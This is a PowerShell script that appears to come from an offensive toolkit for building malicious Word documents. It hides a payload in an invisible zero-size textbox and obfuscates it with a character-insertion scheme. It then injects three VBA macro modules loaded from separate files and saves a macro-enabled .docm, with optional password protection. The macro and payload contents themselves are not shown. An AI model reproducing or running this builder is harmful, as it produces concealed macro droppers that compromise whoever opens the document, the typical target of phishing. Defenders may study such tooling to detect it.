Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#



#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    # AddTextbox(Orientation, Left, Top, Width, Height)
    # https://docs.microsoft.com/en-us/office/vba/api/excel.shapes.addtextbox
    $shape = $wdDoc.Shapes.AddTextbox(1, 72, 72, 0, 0)
    $shape.Name = "testing"
    $shape.TextFrame.TextRange.Text = MangleString -in "`"$payload`""

    $vbaModule1 = $wdDoc.VBProject.VBComponents.Add(1)
    $vbaModule2 = $wdDoc.VBProject.VBComponents.Add(1)
    $vbaModule3 = $wdDoc.VBProject.VBComponents.Add(1)

    $macro1, $macro2, $macro3 = BuildMacro

    $vbaModule1.CodeModule.AddFromString($macro1) | Out-Null
    $vbaModule2.CodeModule.AddFromString($macro2) | Out-Null
    $vbaModule3.CodeModule.AddFromString($macro3) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {

    $macro1 = [System.IO.File]::ReadAllText("$PSScriptRoot\macro1.txt")
    $macro2 = [System.IO.File]::ReadAllText("$PSScriptRoot\macro2.txt")
    $macro3 = [System.IO.File]::ReadAllText("$PSScriptRoot\macro3.txt")

    return $macro1, $macro2, $macro3

}

function MangleString() {
    param(
        [Parameter(mandatory=$false)]
        [String]
        $in
    )

    return $in -replace '(.)','$1ashn'
}